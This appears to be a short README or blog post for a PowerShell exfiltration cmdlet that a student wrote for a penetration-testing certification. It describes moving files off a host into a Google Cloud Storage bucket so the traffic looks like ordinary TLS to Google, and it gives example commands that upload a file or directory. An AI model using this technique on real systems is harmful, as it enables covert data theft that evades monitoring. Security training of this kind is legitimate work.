# Website File Exfil

The idea was to use the google cloud as a way to exfil data as it uses TLS encryption and looks like a host talking to google.

The data can then be viewed anywhere the google storage account is accessed. While this setup requires the install of the google SDK
it does present the intial idea of using it to move files off a host.

This blogpost has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam:
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3237

## Link

Code is located at https://github.com/tubesurf/PSPT

## Getting Started

You need to setup a google cloud account and install the powershell tools. 
The following provides information on how to do this:
* https://cloud.google.com/tools/powershell/docs/quickstart

Once established it's possible to then check via a webrowser the files uploaded or on another computer.

## Example

Commands to run the commandlet...

```
PS C:\> Website-File-Exfil -bucket exfil-bucket -file c:\test.txt
PS C:\> Website-File-Exfil -bucket exfil-bucket -directory c:\Test

```

## Acknowledgments

The Idea for treating googlecloud like a file system for exfiltration from
* https://cloudplatform.googleblog.com/2016/10/treat-Google-Cloud-Storage-like-a-file-system-with-our-new-PowerShell-provider.html

The following setup instructions for google cloud for powershell
* https://4sysops.com/archives/use-powershell-with-google-cloud-platform/

The google cloud reference for functions
* http://googlecloudplatform.github.io/google-cloud-powershell/#/google-cloud-storage